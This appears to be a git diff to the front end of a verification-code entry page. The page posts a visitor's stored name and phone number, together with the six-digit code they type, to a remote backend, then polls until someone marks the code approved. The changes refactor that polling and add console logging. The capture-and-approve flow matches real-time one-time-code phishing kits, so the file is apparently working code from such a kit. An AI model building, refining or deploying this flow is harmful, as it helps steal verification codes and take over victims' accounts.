@@ -9,8 +9,8 @@
     .code-container { background: #fff; padding: 30px; border-radius: 12px; width: 100%; max-width: 350px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); text-align: center; }
     h2 { margin-bottom: 8px; }
     p { color: #666; font-size: 14px; }
-    .code-boxes { display: flex; justify-content: space-between; margin: 25px 0; transition: all 0.3s ease; }
-    .code-boxes input { width: 55px; height: 60px; text-align: center; font-size: 24px; border: 2px solid red; border-radius: 8px; outline: none; transition: border-color 0.2s, box-shadow 0.2s; }
+    .code-boxes { display: flex; justify-content: space-between; margin: 25px 0; }
+    .code-boxes input { width: 55px; height: 60px; text-align: center; font-size: 24px; border: 2px solid red; border-radius: 8px; outline: none; }
     .code-boxes input:focus { border-color: darkred; box-shadow: 0 0 5px rgba(255,0,0,0.5); }
     .shake { animation: shake 0.4s; }
     @keyframes shake { 0% { transform: translateX(0); } 25% { transform: translateX(-5px); } 50% { transform: translateX(5px); } 75% { transform: translateX(-5px); } 100% { transform: translateX(0); } }
@@ -59,6 +59,7 @@ const codeBoxes = document.getElementById('codeBoxes');
 let attempts = 0;
 const maxAttempts = 3;
 let requestId = null;
+let pollInterval = null;
 
 inputs[0].focus();
 
@@ -75,7 +76,6 @@ inputs.forEach((input, index) => {
 
 form.addEventListener('submit', async (e) => {
     e.preventDefault();
-
     const code = [...inputs].map(i => i.value).join('');
     const name = localStorage.getItem('name') || '';
     const phone = localStorage.getItem('phone') || '';
@@ -91,11 +91,14 @@ form.addEventListener('submit', async (e) => {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ name, phone, code })
         });
-
         const data = await res.json();
         requestId = data.requestId;
+        console.log('📨 Code requestId:', requestId);
 
+        // Poll immediately and start interval
         pollCodeApproval();
+        pollInterval = setInterval(pollCodeApproval, 1500);
+
     } catch (err) {
         console.error(err);
         statusText.textContent = 'Failed to submit code. Try again.';
@@ -105,40 +108,41 @@ form.addEventListener('submit', async (e) => {
     }
 });
 
-function pollCodeApproval() {
-    const interval = setInterval(async () => {
-        try {
-            const res = await fetch(`${BACKEND_URL}/check-code/${requestId}`);
-            const data = await res.json();
+async function pollCodeApproval() {
+    if (!requestId) return;
 
-            if (data.approved === true) {
-                clearInterval(interval);
-                window.location.href = 'success.html';
-            }
+    try {
+        console.log('⏱ Polling for approval...', requestId);
+        const res = await fetch(`${BACKEND_URL}/check-code/${requestId}`);
+        const data = await res.json();
+        console.log('📊 Poll result:', data);
 
-            if (data.approved === false) {
-                clearInterval(interval);
-                attempts++;
-                codeBoxes.classList.add('shake');
-                setTimeout(() => codeBoxes.classList.remove('shake'), 400);
+        if (data.approved === true) {
+            clearInterval(pollInterval);
+            console.log('✅ Code approved! Redirecting...');
+            window.location.href = 'success.html';
+        } else if (data.approved === false) {
+            clearInterval(pollInterval);
+            attempts++;
+            codeBoxes.classList.add('shake');
+            setTimeout(() => codeBoxes.classList.remove('shake'), 400);
 
-                if (attempts >= maxAttempts) {
-                    statusText.innerHTML = '<span class="error">Too many failed attempts. Please try again later.</span>';
-                    spinner.style.display = 'none';
-                    return;
-                }
-
-                statusText.innerHTML = '<span class="error">Incorrect code. Please try again.</span>';
+            if (attempts >= maxAttempts) {
+                statusText.innerHTML = '<span class="error">Too many failed attempts. Please try again later.</span>';
                 spinner.style.display = 'none';
-                inputs.forEach(i => i.value = '');
-                inputs[0].focus();
-                button.disabled = true;
-                btnText.textContent = 'Submit Code';
+                return;
             }
-        } catch (err) {
-            console.error(err);
+
+            statusText.innerHTML = '<span class="error">Incorrect code. Please try again.</span>';
+            spinner.style.display = 'none';
+            inputs.forEach(i => i.value = '');
+            inputs[0].focus();
+            button.disabled = true;
+            btnText.textContent = 'Submit Code';
         }
-    }, 2000);
+    } catch (err) {
+        console.error('Polling error:', err);
+    }
 }
 </script>
 </body>
